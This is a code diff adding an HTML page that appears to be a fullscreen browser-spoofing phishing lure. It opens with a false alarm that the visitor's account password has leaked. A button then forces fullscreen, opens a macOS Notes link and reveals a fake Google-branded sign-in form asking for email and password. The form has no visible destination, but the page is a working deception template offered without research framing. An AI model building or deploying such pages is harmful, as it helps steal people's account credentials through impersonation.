@@ -1,1 +1,104 @@
-<input type="button" value="Click here!" onclick='document.documentElement.webkitRequestFullScreen()'>
+<html>
+
+<head>
+    <style>
+        #front {
+            align-items: center;
+            justify-content: center;
+            padding: 25vh;
+            display: block;
+        }
+        
+        #spoofed {
+            display: none;
+        }
+        
+        .header {
+            position: absolute;
+            top: 0;
+            width: 100vw;
+        }
+        
+        #front>h1 {
+            text-align: center;
+            color: #333;
+            margin: 20px 0;
+        }
+        
+        #front>h3 {
+            text-align: center;
+            color: #12f030;
+            margin: 40px 0;
+        }
+        
+        #front>button {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            background-color: #3f51b5;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #runThis {
+            display: none;
+        }
+    </style>
+</head>
+
+<body style="margin: 0;font-family: 'Ubuntu', Arial, sans-serif;overflow: hidden;">
+    <div id="front">
+        <h1>Oh no, your Account password has been leaked. To get your account back, follow these steps:
+            <h3>1. Notify Security Team using the button below.
+                <br>2. On the next page, verify your account password.
+                <h3>
+        </h1>
+        <button onclick="run();">Send Email to Security Team</button>
+
+        <!-- Link menuju Notes macOS -->
+        <a href="notes://showNote?text=⚠️%20Google%20Account%20Alert%0A%0AMy%20password%20was%20leaked.%20Please%20secure%20my%20account." id="runThis"></a>
+    </div>
+
+    <div id="spoofed">
+        <img src="top.png" class="header" />
+        <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+            <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;">
+                <img src="https://www.gstatic.com/identity/boq/accountsettingsmobile/signedout_security_scene_316x112_897e5cfed5be1d1d2e6f376d675ff02d.png" style="display: block; margin: 0 auto;" />
+
+                <form style="margin-top: 50px;">
+                    <h5 style="color: #12f030;">Enter your last used account password to verify.</h5>
+                    <div style="margin-bottom: 20px;">
+                        <label for="email" style="display: block; font-size: 14px;">Email:</label>
+                        <input type="text" id="username" name="username" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
+                    </div>
+                    <div style="margin-bottom: 20px;">
+                        <label for="password" style="display: block; font-size: 14px;">Password:</label>
+                        <input type="password" id="password" name="password" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
+                    </div>
+                    <input type="submit" value="Sign In" style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
+                </form>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        function run() {
+            const firstDiv = document.getElementById("front");
+            const secondDiv = document.getElementById("spoofed");
+            document.documentElement.requestFullscreen();
+            
+            // Buka Notes macOS
+            const trigger = document.getElementById("runThis");
+            trigger.click();
+
+            // Lanjut ke halaman spoof
+            firstDiv.style.display = "none";
+            secondDiv.style.display = "block";
+        }
+    </script>
+</body>
+
+</html>
